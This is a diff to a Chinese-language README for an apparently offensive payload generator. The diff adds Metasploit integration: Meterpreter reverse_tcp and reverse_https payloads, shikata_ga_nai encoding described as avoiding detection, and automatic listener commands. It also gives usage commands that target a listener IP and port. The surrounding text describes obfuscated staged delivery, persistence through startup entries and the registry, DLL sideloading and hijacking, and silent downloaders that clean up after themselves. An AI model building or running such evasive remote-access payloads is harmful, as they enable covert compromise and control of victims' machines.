@@ -43,6 +43,13 @@ WS/
 - **分阶段执行**：多阶段载荷投递
 - **导入混淆**：随机化导入顺序
 
+### 🔫 MSF集成支持
+- **Metasploit载荷**：支持生成MSF载荷
+- **多种载荷类型**：Meterpreter、Shell等多种载荷
+- **载荷编码**：支持多种编码器和迭代加密
+- **自动监听器**：生成对应的监听器命令
+- **载荷包装**：智能包装和混淆MSF载荷
+
 ### 🔄 持久化支持
 - **Windows持久化**：启动项和注册表
 - **Linux持久化**：自启动配置
@@ -84,6 +91,21 @@ python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode si
 python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode hijacking
 ```
 
+### MSF集成模式
+```bash
+# 使用MSF载荷 (需要安装Metasploit)
+python3 main.py -i 192.168.1.100 -p 4444 --use-msf
+
+# 指定MSF载荷类型
+python3 main.py -i 192.168.1.100 -p 4444 --use-msf --msf-payload windows/meterpreter/reverse_tcp
+
+# 使用编码器
+python3 main.py -i 192.168.1.100 -p 4444 --use-msf --msf-encoder x86/shikata_ga_nai --msf-iterations 5
+
+# MSF + 白加黑组合
+python3 main.py -i 192.168.1.100 -p 4444 --use-msf --use-white-black --white-black-mode wrapper
+```
+
 ### 命令行参数
 ```bash
 -i, --ip              监听IP地址 (必需)
@@ -101,6 +123,11 @@ python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode hi
 --use-downloader      生成下载器模式
 --download-url        下载地址 (主程序URL)
 --downloader-silent   下载器静默模式
+--use-msf             使用MSF(Metasploit)载荷
+--msf-payload         MSF载荷类型 (默认: python/meterpreter/reverse_tcp)
+--msf-encoder         MSF编码器 (如: x86/shikata_ga_nai)  
+--msf-iterations      MSF编码迭代次数
+--msf-format          MSF输出格式 (python/raw/exe/dll/powershell)
 --quiet               静默模式
 --silent-delay        执行前延迟时间 (默认: 30秒)
 ```
@@ -123,6 +150,34 @@ python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode hi
 - 下载器体积小，传输方便
 - 支持静默下载和执行
 - 自动清理临时文件
+
+### 🔫 MSF集成模式
+MSF集成模式利用Metasploit框架生成高级载荷：
+
+**功能特点：**
+- 支持所有MSF载荷类型
+- 自动载荷编码和混淆
+- 生成对应监听器命令
+- 与现有功能完全兼容
+
+**使用流程：**
+1. 确保已安装Metasploit框架
+2. 选择合适的载荷类型
+3. 配置编码器和迭代次数
+4. 生成载荷和监听器命令
+5. 使用msfconsole启动监听器
+
+**推荐载荷：**
+- `python/meterpreter/reverse_tcp` - 最通用
+- `python/meterpreter/reverse_https` - 加密传输
+- `windows/meterpreter/reverse_tcp` - Windows环境
+- `linux/x64/meterpreter/reverse_tcp` - Linux环境
+
+**优势：**
+- 全功能Meterpreter会话
+- 高级后渗透功能
+- 载荷自动编码避免检测
+- 支持多种传输协议
 
 ### 🎭 白加黑模式
 白加黑模式会在标准Shell基础上额外生成白加黑载荷文件：
@@ -175,6 +230,13 @@ python3 main.py -i 192.168.1.100 -p 4444 --use-white-black --white-black-mode hi
 - `create_dll_sideloading_payload()`：DLL侧加载载荷生成
 - `create_hijacking_payload()`：DLL劫持载荷生成
 - `generate_white_black_template()`：白加黑模板代码生成
+
+### msf_integration.py - MSF集成模块
+提供Metasploit框架集成：
+- `MSFIntegration`类：MSF载荷生成和管理
+- `create_msf_shell_wrapper()`：MSF载荷包装器生成
+- `get_msf_config_recommendations()`：MSF配置建议
+- 支持多种载荷类型和编码器
 
 ### utils.py - 工具模块
 提供辅助功能：
